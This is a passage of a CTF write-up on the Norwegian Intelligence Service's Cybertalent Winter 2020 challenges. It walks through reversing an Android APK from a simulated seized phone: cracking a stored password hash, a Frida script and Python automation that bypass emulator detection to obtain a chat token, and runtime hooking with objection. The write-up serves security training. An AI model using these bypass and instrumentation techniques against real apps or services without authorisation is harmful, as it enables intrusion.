# Etteretningstjenesten - Cybertalent - Winter 2020 ([Simple version](./README.md))

<p align="center">
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/pixelravn.gif" width="200"><img src="https://mklarz.github.io/cybertalent2020-winter-highscore/static/bug.gif" width="175">
</p>

The Norwegian Intelligence Service (NIS) or Etterretningstjenesten (E-tjenesten) held a CTF for their Cybertalent program. 

The final highscore list can be found [here](https://mklarz.github.io/cybertalent2020-winter-highscore/).

# 0. Preface
Each challenge category have their own more detailed write-up (`DETAILED.md`) containing more theory, information, code and resources than the simplified write-up (`README.md`). You can find the detailed version in the title of every category. Below is a list of all the challenges and the links to them for easy access. The entire write-up can be found below this list.

## Challenges
- [**1. Grunnleggende**](./1_grunnleggende/README.md)
    - [1.5_nettverk](./1_grunnleggende/README.md#md15_nettverk)
- [**2. Oppdrag**](./2_oppdrag/README.md) - [[_Detailed version_]](./2_oppdrag/DETAILED.md)
    - [2.1_beslag](./2_oppdrag/1_beslag/README.md)
        - [2.1_beslag_1](./2_oppdrag/1_beslag/1/README.md)
        - [2.1_beslag_2](./2_oppdrag/1_beslag/2/README.md)
        - [2.1_beslag_3](./2_oppdrag/1_beslag/3/README.md)
    - [2.2_seatheworld](./2_oppdrag/2_seatheworld/README.md)
        - [2.2_seatheworld](./2_oppdrag/2_seatheworld/1/README.md)
        - [2.2_seatheworld_aksess](./2_oppdrag/2_seatheworld/aksess/README.md)
        - [2.2_seatheworld_booking](./2_oppdrag/2_seatheworld/booking/README.md)
        - [2.2_seatheworld_ekstra](./2_oppdrag/2_seatheworld/ekstra/README.md)
    - [2.3_scada](./2_oppdrag/3_scada/README.md)
        - [2.3_onion](./2_oppdrag/3_scada/onion/README.md)
        - [2.3_scada_aksess](./2_oppdrag/3_scada/aksess/README.md)
        - [2.3_scada_gissel](./2_oppdrag/3_scada/gissel/README.md)
- [**3. Utfordringer**](./3_utfordringer/README.md) - [[_Detailed version_]](./3_utfordringer/DETAILED.md)

    - [3.1. Utfordringer lett](./3_utfordringer/1_lett/README.md) - [[_Detailed version_]](./3_utfordringer/1_lett/DETAILED.md)
        - [3.1.1_clmystery](./3_utfordringer/1_lett/clmystery/README.md)
        - [3.1.2_fibonacci](./3_utfordringer/1_lett/fibonacci/README.md)
        - [3.1.3_math](./3_utfordringer/1_lett/math/README.md)
            - [3.1.3_math_1](./3_utfordringer/1_lett/math/README.md#313_math_1)
            - [3.1.3_math_2](./3_utfordringer/1_lett/math/README.md#313_math_2)
        - [3.1.4_rusty_reversing_easy](./3_utfordringer/1_lett/rust_lett/README.md)
        - [3.1.8_punchcard](./3_utfordringer/1_lett/punchcard/README.md)
        - [3.1.9_secret](./3_utfordringer/1_lett/secret/README.md)

    - [3.2. Utfordringer middels](./3_utfordringer/2_middels/README.md) - [[_Detailed version_]](./3_utfordringer/2_middels/DETAILED.md)
        - [3.2.1_coordinate](./3_utfordringer/2_middels/coordinate/README.md)
            - [3.2.1_coordinate_r](./3_utfordringer/2_middels/coordinate/r/README.md)
            - [3.2.1_coordinate_g](./3_utfordringer/2_middels/coordinate/g/README.md)
            - [3.2.1_coordinate_b](./3_utfordringer/2_middels/coordinate/b/README.md)
            - [3.2.1_coordinate_a](./3_utfordringer/2_middels/coordinate/a/README.md)
        - [3.2.2_minesweeper](./3_utfordringer/2_middels/minesweeper/README.md)
            - [3.2.2_minesweeper_easy](./3_utfordringer/2_middels/minesweeper/README.md)
            - [3.2.2_minesweeper_medium](./3_utfordringer/2_middels/minesweeper/README.md)
            - [3.2.2_minesweeper_hard](./3_utfordringer/2_middels/minesweeper/README.md)
        - [3.2.3_transfer](./3_utfordringer/2_middels/transfer/README.md)
            - [3.2.3_transfer_easy](./3_utfordringer/2_middels/transfer/easy/README.md)
            - [3.2.3_transfer_medium](./3_utfordringer/2_middels/transfer/medium/README.md)
        - [3.2.4_rusty_reversing_medium](./3_utfordringer/2_middels/rust_middels/README.md)

    - [3.3. Utfordringer vanskelig](./3_utfordringer/3_vanskelig/README.md) - [[_Detailed version_]](./3_utfordringer/3_vanskelig/DETAILED.md)
        - [3.3.1_euler](./3_utfordringer/3_vanskelig/euler/README.md)
            - [3.3.1_euler_1](./3_utfordringer/3_vanskelig/euler/1/README.md)
            - [3.3.1_euler_2](./3_utfordringer/3_vanskelig/euler/2/README.md)
            - [3.3.1_euler_3](./3_utfordringer/3_vanskelig/euler/3/README.md)
                - [3.3.1_euler_3a](./3_utfordringer/3_vanskelig/euler/3/README.md#331_euler_3a)
                - [3.3.1_euler_3b](./3_utfordringer/3_vanskelig/euler/3/README.md#331_euler_3b)
                - [3.3.1_euler_3c](./3_utfordringer/3_vanskelig/euler/3/README.md#331_euler_3c)
                - [3.3.1_euler_3d](./3_utfordringer/3_vanskelig/euler/3/README.md#331_euler_3d)
        - [3.3.2_rusty_reversing_hard](./3_utfordringer/3_vanskelig/rust_vanskelig/README.md)
    - [3.4. Utfordringer umulig](./3_utfordringer/4_umulig/README.md)
        - [3.4.8_transfer.root](./3_utfordringer/4_umulig/README.md#348_transfer_root)
- [**9. Gammelt**](./9_gammelt/README.md)
- [**9000. Madness**](./9000_madness)
    - [2_seatheworld_bookings_bruteforcer](./9000_madness/2_seatheworld_bookings_bruteforcer/README.md)
    - [2_seatheworld_bookings_parser](./9000_madness/2_seatheworld_bookings_parser/README.md)
    - [2_seatheworld_data_set_downloader](./9000_madness/2_seatheworld_data_set_downloader/README.md)

# [1. Grunnleggende](./1_grunnleggende)
Having completed last years CTF, these challenges (except **1.5_nettverk**) were copy paste from my notes. You can find more information regarding the challenges in these write-ups [Sithis](https://github.com/williamsolem/Etjenesten-Cybertalent-CTF-Writeup), [Agent Random](https://blog.agentrandom.com/cybertalent-ctf/), [zig](https://www.indregard.no/2020/03/e-tjenestens-ctf/), [UnblvR](https://github.com/myrdyr/ctf-writeups/tree/master/etjenesten20), or [SgtSIGSEGV](https://blog.mrfjo.org/2020/03/02/NIS-Cybertalent).

### [1.5_nettverk](./1_grunnleggende#15_nettverk)
Simple Python networking challenge. More information on Python socket programming can be found in the official Python documentation [here](https://docs.python.org/3/howto/sockets.html) and [here](https://docs.python.org/3/library/socket.html).


# [2. Oppdrag](./2_oppdrag)
We are informed that a group of terrorists have kidnapped an unknown amount of people from a Norwegian research vessel "MS KOLDBJORN". The entire rep can be found in Norwegian [here](./2_oppdrag/INTREP.txt).

Our priorities are to:
1. Release the hostage(s)
2. Identifiy the kidnappers
3. Hold onto the Norwegian sovereignty of the Queen and Motherland (Note: the translation here might be incorrect, search for "Dronning Maud Land" [here](https://www.stortinget.no/globalassets/pdf/stortingsarkivet/duuk/1946-1965/590622u.pdf))

We are provided with 2 files, a pcap file ([`traffic_log_suspect_3577374.pcap`](./2_oppdrag/traffic_log_suspect_3577374.pcap)), which contains network traffic from one of the confiscated phones, and an archive ([`phone_dump.tgz`](./2_oppdrag/phone_dump.tgz)) containing the contents of an Android mobile phone that was confiscated from one of the suspects.

We start with extracting the archive, and find the following files:
```
├── data
│   └── data
│       └── no.cybertalent.liberatortoolkit
│           ├── databases
│           │   └── users.db
│           ├── files
│           │   └── data.bin
│           └── shared_prefs
│               ├── ChatActivity.xml
│               └── VaultActivity.xml
└── sdcard
    ├── Android
    │   └── data
    │       └── no.cybertalent.liberatortoolkit
    │           └── files
    │               ├── !aW1wb3J0YW50X2xpbmtz
    │               ├── !c2hvcHBpbmdfbGlzdA==
    │               ├── !dG9kbw==
    │               └── !ZmxhZw==
    └── Download
        └── lt3000.apk

12 directories, 9 files
```

In the dump we have an APK, and the application data for it. Having never done a proper Android/APK reversing I spent some extra time setting up a proper environment. I decided to learn how to use the following tools:

- [Android Studio](https://developer.android.com/studio) with a Android Virtual Device (AVD) image without the Play API
- [JADX](https://github.com/skylot/jadx) to decompile the APK
- [Frida](https://frida.re/) for hijacking and dynamic reverse engineering of the Android application
- [objection](https://github.com/sensepost/objection) for some extra Android explotation fun

With the environment now setup, we can continue our investigation below. 






## [2.1_beslag](./2_oppdrag/1_beslag)
We start by decompiling the APK with JADX, and find a package named `no.cybertalent.liberatortoolkit`, with the following classes:

```sh
├── ChatActivity.java
├── EditActivity.java
├── helpers
│   ├── ChatHelper.java
│   └── CheckHelper.java
├── MainActivity.java
├── R.java
├── TunerActivity.java
└── VaultActivity.java
```

**Note:** Enabling the `Show Inconsistent code` option in the JADX preference is very helpful.

![ec5edf6fa99b426186ffbce24a8f0b11.png](./2_oppdrag/1_beslag/screenshots/ec5edf6fa99b426186ffbce24a8f0b11.png)

Looking through the classes we find a found 3 interesting Activity classes: `TunerActivity`, `ChatActivity`, and `VaultActivity`. We also find some helper classes (`ChatHelper` and `CheckHelper`) that check if the application is running in an emulator (`ChatHelper.emu`), and if the Android is rooted (`CheckHelper.is(Context context`).

In addition we find a native library named `libnative-lib.so` with the following functions:
```
ChatHelper.getResponse
VaulActivity.finalize
VaulActivity.undo
```

---

#### Installation
Continuing with setting up Android Studio and start an AVD (Android Virtual Device) to install and run the APK. It's important to use an Android image without the Play Store API, as it does not allow us to root. We start the emulator, install the APK, and transfer over the data.


```sh
$ emulator -writable-system -avd cybertalent21_oppdrag -no-snapshot-load -qemu
$ adb devices
List of devices attached
emulator-5554	device
$ adb root
restarting adbd as root
$ adb install lt3000.apk
$ adb push data/* /data/user/0
$ adb push sdcard/* /sdcard
```

![a6e964ea33dc48be8a416e543a4ceb9b.png](./2_oppdrag/1_beslag/screenshots/a6e964ea33dc48be8a416e543a4ceb9b.png)

When we launch the application we are presented with the following screen.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/1_beslag/screenshots/adcd050632644c9abe2ab93ef7cbf942.png" width="200">

Each button map to each activity we found earlier in the decompiled APK, we therefore assume that each button corresponds to each challenge (`2.1_beslag_x`).


### [2.1_beslag_1](./2_oppdrag/1_beslag/1)

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/1_beslag/1/screenshots/a6b5a8142ef947baa332361cedb37b68.png" width="200">

We are presented with some form of authentication, and a channel switcher with 9 channels. The channels play various audio, mostly static, but also some music and a radio show.

---

#### Reversing
Checking `TunerActivity` there is a function `onValueChange` that is called everytime the channel is changed. There is some form authentication that checks the username and password through a SQLite database.
```java
SQLiteDatabase readableDatabase = new c.a.a.d.b(tunerActivity2).getReadableDatabase();
Cursor query = readableDatabase.query("users", new String[]{"password_hash"}, "username = ?", new String[]{charSequence}, null, null, null);
```

In addition, there is some interesting code that does something different on Channel 7 when the user is authenticated, it calls `c.a.a.d.a.b` with two files, `data.bin`, and `data.mp3`. 
```java
if (this.f1160a.getValue() == 7) {
  if (z) {
    File file = new File(TunerActivity.this.getFilesDir().getAbsolutePath() + "/data.bin");
    File file2 = new File(TunerActivity.this.getFilesDir().getAbsolutePath() + "/data.mp3");
    c.a.a.d.a.b(file, file2, charSequence2.getBytes());
    TunerActivity.this.p = Uri.fromFile(file2);
    TunerActivity.this.o = 0;
  } else {
    tunerActivity = TunerActivity.this;
    i3 = R.raw.static4;
  }
}
```

---

#### `data.bin`
Looking back to the files provided with the challenge, we find `data.bin`. It is however containing some form of raw or encrypted data.

```sh
$ file data/data/no.cybertalent.liberatortoolkit/files/data.bin
data/data/no.cybertalent.liberatortoolkit/files/data.bin: data
```

There is however no `data.mp3`, looking closer at the decompiled code we find the following function call.
```java
c.a.a.d.a.b(file, file2, charSequence2.getBytes());
```

The `c.a.a.d.a` class contains various functions, shortly put; it uses the provided password and a static salt to generate a `SecretKey` that is used to AES decrypt `data.bin`.
```java
public static final byte[] f1089a = "saltpaamaten".getBytes();
public static final char[] f1090b = "0123456789ABCDEF".toCharArray();
```

And within the `c.a.a.d.a.b(File, File, byte[])` function
```java
Cipher instance = Cipher.getInstance("AES/CBC/PKCS5Padding");
byte[] readAllBytes = Files.readAllBytes(file.toPath());
byte[] copyOfRange = Arrays.copyOfRange(readAllBytes, 0, 16);
byte[] copyOfRange2 = Arrays.copyOfRange(readAllBytes, 16, readAllBytes.length);
SecretKey c2 = c(bArr);
```

We now know that we need to find the user credentials to decrypt the file.

---

#### `users.db`
Knowing that the credentials are stored in a SQLite database, we recall that there is a `users.db` file in the phone dump that we can look closer at.

```sh
$ sqlite3 data/data/no.cybertalent.liberatortoolkit/databases/users.db
SQLite version 3.33.0 2020-08-14 13:23:32
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> .headers ON
sqlite> SELECT * FROM users;
_id|username|firstname|lastname|password_hash
1|hungry_hippo_123|Frank|Shorius|2034F6E32958647FDFF75D265B455EBF
```

We now have have a username, name and a hashed password. After a quick Google search, we find out that the password is `secretpassword`, giving us: `hungry_hippo_123:2034F6E32958647FDFF75D265B455EBF:secretpassword`.

Plotting the credentials into the app and scrolling through the channels we get some different audio for Channel 7, a robotic woman repeating the phrase:
> Your flag is london underscore calling.

The `data.mp3` file can be found [here](./2_oppdrag/1_beslag/1/data.mp3).

---

```sh
login@corax:~$ scoreboard london_calling
Kategori: 2. Oppdrag
Oppgave:  2.1_beslag_1
Svar:     london_calling

Bra jobbet!
Det hadde vært praktisk om vi visste hvordan de har kommunisert.
```






### [2.1_beslag_2](./2_oppdrag/1_beslag/2)
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/1_beslag/2/screenshots/c31cc360cb9e4ef79c39d8f7bffa223d.png" width="200">

Opening the **Chat** we are presented with a view with `Access Denied` and tells us to log in to https://mobile.cybertalent.no/challenge.

* * *

#### mobile.cybertalent.no

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/1_beslag/2/screenshots/5f0651cd892341d1b38be71f045f05fd.png" width="300">

We re-use the credentials from **2.1\_beslag\_1** (`hungry_hippo_123:secretpassword`) to successfully login, and are now presented with some challenge words. The words are refreshed every 10 seconds. Submitting something random calls a `POST /challenge` and returns `Bad response code`.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/1_beslag/2/screenshots/eaabfc39f79f4efbaffd3b18d7c0fd6c.png" width="300">

Sending the challenge into the application with `/response TroveShrineMarbleBehavior` gives us the following response, which also returns `Bad response code` when submitting.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/1_beslag/2/screenshots/d7ff0ae189ee4515a982c84360406fda.png" width="300">

* * *

#### Reversing

##### `ChatActivity.onCreate(Bundle)`

When `ChatActivity` is created the `onCreate` method is called, which again sets up new [`View.OnKeyListener`](https://developer.android.com/reference/android/view/View.OnKeyListener) (via. `new a()`). The public method [`onKey`](https://developer.android.com/reference/android/view/View.OnKeyListener#onKey%28android.view.View,%20int,%20android.view.KeyEvent%29 "https://developer.android.com/reference/android/view/View.OnKeyListener#onKey(android.view.View,%20int,%20android.view.KeyEvent)") in this class listens to the input. Then it loads in the `SharedPreferences` for `ChatActivity`, and finally starts the activity thread with the `new b()` (`Runnable`) class.

```java
public void onCreate(Bundle bundle) {
    // snip...
    this.p.setOnKeyListener(new a());
    SharedPreferences preferences = getPreferences(0);
    // snip...
    Thread thread = new Thread(new b());
    thread.start()
}
```

* * *

##### `ChatActivity.q` (`SharedPreferences`)

The `SharedPreferences` can be found in `data/data/no.cybertalent.liberatortoolkit/shared_prefs/ChatActivity.xml` of the phone dump.

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="nick">hungry_hippo_123</string>
    <string name="token">0000</string>
</map>
```

* * *

##### `ChatActivity.b.run()`

As mentioned, `ChatActivity.onCreate` starts the activity thread with a new instance of the `ChatActivity.b` (`Runnable`) class, which contains the following code for the `ChatActivity.b.run()` function.
`ChatHelper.a(String, String)` is a function that handles the communication between the application and the remote chat API. When this is first run it calls `https://mobile.cybertalent.no/chat?token=0000`, which responds with the text seen in the initial chat screenshot above.

```java
ChatActivity.this.o.post(new a(ChatHelper.a("chat", ChatActivity.q.getString("token", "0000"))));
Thread.sleep(1000);
```

* * *

##### `ChatActivity.a.onKey(View, int, KeyEvent)`

The `onKey` only function calls the `ChatActivity.t()` if the input key is `Enter`.

```java
public boolean onKey(View view, int i, KeyEvent keyEvent) {
    if (keyEvent.getAction() != 0 || i != 66) {
        return false;
    }
    ChatActivity chatActivity = ChatActivity.this;
    SharedPreferences sharedPreferences = ChatActivity.q;
    chatActivity.t();
    return true;
}
```

* * *

##### `ChatActivity.t()`

`t()` is a function that handles all the input (general chat) and commands (`/nick`, `/token` and `/response`) from the input field, as shown below.

* * *

###### `/response <challenge>`

The following code is executed when the input matches `/response <challenge>`. `ChatHelper.getResponse(String)` is called with the provided challenge, in addition `a1` is prefixed to the final string if the static boolean `ChatHelper.emu` is `true`.

```java
String response = ChatHelper.getResponse(split[1]);
StringBuilder sb = new StringBuilder();
if (ChatHelper.emu) {
  sb.append("a1");
}
sb.append(response.toLowerCase());
// --- snip ---
```

* * *

###### say

A new thread is started if the input is not a command (begins with a `/`), `ChatActivity.c` is a `Runnable` class.

```java
new Thread(new c(charSequence)).start();
```

* * *

###### `ChatActivity.c.run()`

This function fetches `token` and `nick` from `SharedPreferences`, and then does a `POST https://mobile.cybertalent.no/say` with a simple JSON object:

```json
{
    "content": "<input>",
    "token": "<SharedPreferences.token>",
    "nick": "<SharedPreferences.nick>"
}
```

* * *

##### `ChatHelper.getResponse(String)`

`getResponse` is a native function, that uses functions provided in a provided native library.

```java
public static native String getResponse(String str);
```

Let's take a closer look at the `getResponse` function in the native library that was extracted from the APK.

* * *

###### `libnative-lib.so`

We find that that the native `getResponse` function (`Java_no_cybertalent_liberatortoolkit_helpers_ChatHelper_getResponse`) calls `ChatHelper` and prefixes the return string with `deadbeef` if `CheckHelper.emu` is `true`.

```c
lVar3 = (**(code **)(*param_1 + 0x480))(param_1,param_2,&DAT_00100a8e,&DAT_00100a19); // DAT_00100a8e = emu
if (lVar3 != 0) {
	cVar1 = (**(code **)(*param_1 + 0x490))(param_1,param_2,lVar3);
	local_59 = cVar1 == '\0';
}
// --- snip ---
bVar9 = (local_59 & 1) == 0;
if (bVar9) {
	*(undefined8 *)((long)pvVar5 + 1) = 7378415037781730660; // feebdaed => deadbeef
}
```

* * *

##### `ChatHelper.emu`

`emu` is a static boolean variable, that checks if the application is running within an emulator, we therefore need to find a way to override the results of this variable.

```java
public static final boolean emu;

static {
  boolean z;
  if (!Build.BRAND.startsWith("generic") || !Build.DEVICE.startsWith("generic")) {
    String str = Build.FINGERPRINT;
    if (!str.startsWith("generic") && !str.startsWith("unknown")) {
      String str2 = Build.HARDWARE;
      if (!str2.contains("goldfish") && !str2.contains("ranchu")) {
        String str3 = Build.MODEL;
        if (!str3.contains("google_sdk") && !str3.contains("Emulator") && !str3.contains("Android SDK built for x86") && !Build.MANUFACTURER.contains("Genymotion")) {
          String str4 = Build.PRODUCT;
          if (!str4.contains("sdk_google") && !str4.contains("google_sdk") && !str4.contains("sdk") && !str4.contains("sdk_x86") && !str4.contains("vbox86p") && !str4.contains("emulator") && !str4.contains("simulator")) {
            z = false;
            emu = z;
          }
        }
      }
    }
  }
  z = true;
  emu = z;
}
```

* * *

#### Solution flow

We now have everything we need to generate a correct response code and get a token, and we know that every response code is only valid for 10 seconds, our flow will be the following:

1.  Override the `ChatHelper.emu` static variable to return `false`.
2.  Login to the `mobile.cybertalent.no` portal via. `/login` with the credentials `hungry_hippo_123:secretpassword`.
3.  Get a challenge code from `/getchall`.
4.  Pass the challenge code into the `ChatHelper.getResponse()` method.
5.  Submit the generated response code to `/challenge` and get our token.
6.  Fetch the chat from `/chat?token=x` with our token.

* * *

##### Automation

To interact with the Android application we can use [Frida](https://frida.re/), which is a dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers. We need to override the value of `ChatHelper.emu` and then call the `ChatHelper.getResponse` function. The Frida [JavaScript API](https://frida.re/docs/javascript-api/) is well documented and we finish our script.

###### [`frida-chat.js`](./2_oppdrag/1_beslag/2/frida-chat.js)

```js
console.log("Loaded frida-chat.js");

function getResponse(challenge) {
  setTimeout(function() {
    Java.perform(function () {
      var ChatHelper = Java.use("no.cybertalent.liberatortoolkit.helpers.ChatHelper")
      ChatHelper.emu.value = false;
      send(ChatHelper.getResponse(challenge));
    });
  }, 100);
}

rpc.exports = {
    getresponse: getResponse
};
```

* * *

Combining this with some python code automates this entire solution flow for us, in addition the code also launches / spawns the application. Running the script takes about a second and successfully generates a valid token and extracts the chat.

###### [`extract_chat.py`](./2_oppdrag/1_beslag/2/extract_chat.py)

```python
import sys
import frida
import requests

s = requests.Session()

def login():
    r = s.post("https://mobile.cybertalent.no/login", json={
        "user": "hungry_hippo_123",
        "pass": "secretpassword"
    });
    r.raise_for_status()
    j = r.json()
    if "success" not in j or j["success"] != "Logged in":
        print("Failed logging in:")
        print(j)
        exit(1)

def get_challenge():
    login()
    r = s.post("https://mobile.cybertalent.no/getchall")
    r.raise_for_status()
    return r.json()["chall"]

def get_token(response):
    r = s.post("https://mobile.cybertalent.no/challenge", json={
        "response": response
    })
    j = r.json()
    return j["success"]

def get_chat(token):
    r = s.get("https://mobile.cybertalent.no/chat?token=" + token)
    return r.content.decode()

def on_message(message, data):
    if "payload" in message:
        response = message["payload"].lower()
        print("Response:", response)
        token = get_token(response)
        print("Token:", token)
        chat = get_chat(token)
        print(chat)
    else:
        print(message)
        print(data)
    exit(0)

with open("frida-chat.js") as f:
    ss = f.read()

device = frida.get_usb_device()
pid = device.spawn(["no.cybertalent.liberatortoolkit"])
session = device.attach(pid)

script = session.create_script(ss)
script.on("message", on_message)
script.load()

challenge = get_challenge()
print("Challenge:", challenge)

script.exports.getResponse(challenge)
device.resume(pid)
sys.stdin.read()
```

* * *

```sh
$ python extract_chat.py > chat.txt
Loaded frida-chat.js
Challenge: GorillaPoloOperatingBreeze
Response: 5fa780b9babab1a6a7baa74786bd80b182b9a4bf5080bdbd88bd
Token: 7c6ccda74458e01ec197
```

Entering the token into the app with `/token 7c6ccda74458e01ec197` gives us the following view:

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/1_beslag/2/screenshots/f59754f0f1ee44198cf861d09bd836f4.png" width="200">

```sh
$ cat chat.txt | head -n 20
############################################
#      Welcome to the #LT3000 chat.        #
#                                          #
# * Use at own risk.                       #
# * All comms are encrypted.               #
# * Please do not use real names.          #
# * Have fun!                              #
#                                          #
############################################


2 users currently online.

FLAG: 04907eee5386072670b5107b744b2f8481294377

--- Day changed 02 DES 2020 ---

[09:04] B4tCracK: Hi every1, i read that SecureChat was bought by some megacorp, don't think it's safe anymore. let's talk here instead
[09:40] RADAR: willco
[09:46] eireen89: You made this thing all by yourself?
```

The entire chat log can be found [here](./2_oppdrag/1_beslag/2/chat.txt).

* * *

```shell
login@corax:~$ scoreboard 04907eee5386072670b5107b744b2f8481294377
Kategori: 2. Oppdrag
Oppgave:  2.1_beslag_2
Svar:     04907eee5386072670b5107b744b2f8481294377

Flott! Nå vet vi litt mer om gisseltakerne.
Ligger det noen interessante filer eller tekniske spor her også?
```

---









### [2.1_beslag_3](./2_oppdrag/1_beslag/3)


<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/1_beslag/3/screenshots/ccf96e06b1e14cd9a87f104ffbe11aa4.png" width="200">

The **Vault** view has a 4 number input (a PIN), and a list of 4 different items, we recall the items being files found from the initial phone dump.

```sh
└── sdcard
    └── Android
        └── data
            └── no.cybertalent.liberatortoolkit
                └── files
                    ├── !aW1wb3J0YW50X2xpbmtz
                    ├── !c2hvcHBpbmdfbGlzdA==
                    ├── !dG9kbw==
                    └── !ZmxhZw==
```

The names are encoded in base 64, decoding them gives us the following names

```
important_links
shopping_list
todo
flag                           
```

* * *

#### Reversing

##### `VaultActivity.onCreate(Bundle)`

When `VaultActivity` is created the `onCreate` method is called, which initializes the 4 NumberPickers and loads in the `SharedPreferences` and checks for the locked state and the hash of the pin. It then ends by creating a new instance of the `c.a.a.d.c` class. The `VaultActivity` has a `onLockerClick` listener that triggers whenever the **UNLOCK**/**LOCK** button is clicked.

```java
// --- snip ---
SharedPreferences preferences = getPreferences(0);
s = preferences;
if (!preferences.contains("locked")) {
    w(false);
}
if (!s.contains("pin_hash")) {
    SharedPreferences.Editor edit = s.edit();
    edit.putString("pin_hash", "null");
    edit.apply();
}
// --- snip ---
new c(this).execute(new Void[0]);
```

* * *

##### `SharedPreferences`

The `SharedPreferences` can be found in `data/data/no.cybertalent.liberatortoolkit/shared_prefs/VaultActivity.xml` of the phone dump.

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="locked" value="true" />
    <string name="pin_hash">BSzN6uy2dDcolImpMKxffg==</string>
</map>
```

* * *

##### `VaultActivity.onLockerClick(View)`

The function starts by checking `VaultActivity.u()`, which returns `true` if the Vault is in a locked state. It then grabs the value of each number picker (the pin numbers) and first calls `t(pin)`, and then calls the `finalize` function with the result from `t(pin)`.

It then base 64 encodes the first 16 bytes from the `finalize` function, and compares this to the `pin_hash` in our `SharedPreferences`. If it matches, it continues looping through the files above, and passes them to `c.a.a.d.a.b(File, File, byte[])`, with the encoded filename, decoded filename, and the remaining 32 bytes from the `finalize` function, as arguments.

```java
if (u()) {
    r = new StringBuilder();
    Iterator<NumberPicker> it = q.iterator();
    while (it.hasNext()) {
        r.append(it.next().getValue());
    }
    byte[] finalize = finalize(t(r.toString()));
    // --- snip ---
    if (Base64.encodeToString(Arrays.copyOfRange(finalize, 0, 16), 0).trim().equals(s.getString("pin_hash", null).trim())) {
        File[] fileArr = p;
        int length = fileArr.length;
        int i5 = 0;
        while (i5 < length) {
            File file = fileArr[i5];
            if (file.getName().startsWith("!") && u()) {
                c.a.a.d.a.b(file, new File((file.getParent() + "/" + new String(Base64.decode(file.getName().substring(i4), 0))).replace(str4, str3)), Arrays.copyOfRange(finalize, 16, 48));
                // --- snip ---
            }
            i5++;
            i4 = 1;
        }
    }
// --- snip ---
```

#### `c.a.a.d.c`

This is a `AsyncTask` class is called at the end of `VaultActivity.onCreate`. It downloads a file from `https://mobile.cybertalent.no/xtra` (a copy can be found [here](./2_oppdrag/1_beslag/3/xtra)), and once downloaded executes `VaultActivity.undo` with the data, and then sets the `VaulActivity.t` **variable** (not the function) to the result of the `undo` function.

```java
// --- snip ---
InputStream openStream = new URL("https://mobile.cybertalent.no/xtra").openStream();
ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
// --- snip ---
return byteArrayOutputStream.toByteArray();
// --- snip ---
VaultActivity.t = ByteBuffer.wrap(vaultActivity.undo(bArr2));
```

##### `VaultActivity.undo(byte[])`

`undo` is a native function, that uses functions provided in a provided native library.

```java
public native byte[] undo(byte[] bArr);
```

We could take a close look at the `undo` function in the native library that was extracted from the APK earlier, and we could use Frida to read the return data, but we decide to test out [objection](https://github.com/sensepost/objection).

> `objection` is a runtime mobile exploration toolkit, powered by Frida, built to help you assess the security posture of your mobile applications, without needing a jailbreak.

We start objection and start listening to function calls to `undo`.

```sh
$ objection -g no.cybertalent.liberatortoolkit explore
Using USB device `Android Emulator 5556`
Agent injected and responds ok!

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.9.6

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
...o.cybertalent.liberatortoolkit on (pwn: 8.0.0) [usb] #
```

```
# android hooking watch class_method no.cybertalent.liberatortoolkit.VaultActivity.undo --dump-args --dump-backtrace --dump-return

(agent) Attempting to watch class no.cybertalent.liberatortoolkit.VaultActivity and method undo.
(agent) Hooking no.cybertalent.liberatortoolkit.VaultActivity.undo([B)
(agent) Registering job 8769892465034. Type: watch-method for: no.cybertalent.liberatortoolkit.VaultActivity.undo

```
And after launching Vault we see that `undo` function has been called:

```

(agent) [8769892465034] Arguments no.cybertalent.liberatortoolkit.VaultActivity.undo([100,120,48,53,79,103,27,-9,92,-72,-93,-75,14,111,54,80,100,0,112,0,120,52,0,0,0,0,-72,0,29,0,112,0,10,0,-28,...)
(agent) [8769892465034] Return Value: [100,101,120,10,48,51,53,0,79,-51,103,-12,27,...]

```
Saving the return bytestream to a file, we get a `Dalvik dex file`, and can now decompile it with JADX. We see that this `extra` class has a `getData` function that accepts a String `str`, it appends the salt `y_so_salty` to the string and then generates a MD5, and a SHA256 hash out of the string. It then returns them both in the same output, in that order. The class and java source files can be found [here](./2_oppdrag/1_beslag/3).

```java
public class extra {
    private static final String SALT = "y_so_salty";
    public static byte[] getData(String str) {
        StringBuilder sb = new StringBuilder();
        sb.append(str);
        sb.append(SALT);
        // --- snip ---
        MessageDigest instance = MessageDigest.getInstance("md5");
        instance.update(sb.toString().getBytes());
        bArr = instance.digest();
        MessageDigest instance2 = MessageDigest.getInstance("sha256");
        // --- snip ---
        return byteArrayOutputStream.toByteArray();
```

* * *

##### `VaultActivity.t(String)`

The argument passed into the function is the PIN (i.e. `"0000"`, `"1337"`). The function attempts to load the `VaultActivity.t` **variable** (not the function) into memory as a class and call the `extra.getData(String)` method.
We now know that the `getData` function returns a MD5 digest, followed by a SHA256 digest, which is exactly what this function (`t(String)`) does as well, it is only a wrapper around the `getData` function call.

```java
public final byte[] t(String str) {
    // --- snip ---
